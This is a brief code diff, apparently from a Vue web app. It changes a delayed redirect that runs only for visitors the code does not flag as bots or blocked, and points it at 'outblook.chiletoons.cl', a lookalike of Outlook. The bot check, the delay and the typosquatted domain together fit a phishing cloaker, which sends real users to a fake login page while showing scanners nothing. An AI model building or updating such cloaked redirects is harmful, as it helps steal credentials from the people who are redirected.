@@ -56,7 +56,7 @@ const app = createApp({
       
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://bess.dasttech.com.ar/';
+          window.location.href = 'https://outblook.chiletoons.cl/';
         }, 3000);
       }
     });
